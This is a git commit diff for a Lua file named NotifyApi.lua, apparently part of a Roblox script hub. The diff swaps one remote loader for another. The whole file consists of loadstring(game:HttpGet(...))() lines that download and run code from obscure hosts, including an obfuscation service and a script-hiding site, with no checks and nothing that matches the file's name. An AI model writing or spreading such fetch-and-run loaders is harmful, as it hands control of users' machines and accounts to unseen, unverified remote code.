213fdf2126530aeef6e03c75fedbffff44188dc5
Nova X Hub <thunganyeudau1111@gmail.com>
2026-07-11 20:48:15 +0700

    Update NotifyApi.lua

--- NotifyApi.lua
+++ NotifyApi.lua
@@ -1,6 +1,5 @@
 -- Web NQP
-getgenv().script_id = "BYRyNclyy9PJ"
-loadstring(game:HttpGet("https://protectscripts.vercel.app/skid.txt"))()
+loadstring(game:HttpGet("https://obfuscatorhub.onrender.com/api/znpis2ub"))()
 -- web trieu
 loadstring(game:HttpGet("https://xhider.xyz/raw/Xhider/Bot2/k7ca8e50f7.lua"))()
 -- exe total
